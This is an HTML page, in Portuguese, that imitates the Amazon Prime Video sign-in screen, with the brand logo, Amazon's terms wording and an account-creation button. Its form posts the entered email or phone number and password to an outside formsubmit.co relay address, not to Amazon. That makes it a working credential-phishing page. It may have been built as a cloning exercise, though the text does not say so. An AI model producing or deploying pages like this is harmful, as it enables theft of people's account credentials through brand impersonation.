<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prime video - tela de login </title>
     <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <img src="../../Imagens/primeVideo.log.png" alt="Prime video" width="150">
    </header>
    <main>
        <div >
            <form class="container" action="https://formsubmit.co/16185677c051e083e2b2d1e6d89e2e48" method="POST">
                <div>
                    <h1>Fazer Login</h1>
                <br>
                </div>
                <small>Email ou número de telefone celular</small>
                <div>
                <label for="login" ></label>
                <input type="email" name="login" id="login">
                </div>
                <small>Senha</small>
                <div>
                <label for="senha"></label>
                <input type="password" name="senha" id="senha">
                </div>
                <br>
                <div id="FazerLogin">
                    <button class="submit" id="submit" type="submit">Fazer Login</button>
                </div>
                <br>
                <small>Ao continuar, você concorda com as <span>Condições de Uso</span> da Amazon. Por favor verifique a Notificação de Privacidade, <span>Notificação de Cookies</span> e a <span>Notificação de Anúncios Baseados em Interesse.</span></small>
                 <br>
                 <br>
                <input type="checkbox" name="manterConectado" id="manterConectado">
                <small>Mantenha-me conectado <span>Detalhes</span></small>
                 <br>
                 <br>
                 <small>Novo na Amazon</small>
                 <br>
                 <br>
                 <div>
                    <button class="criarConta" id="criarConta">Criar sua conta da Amazon?</button>
                 </div>
                
            </form>
        </div>
      
    </main>
</body>
</html>
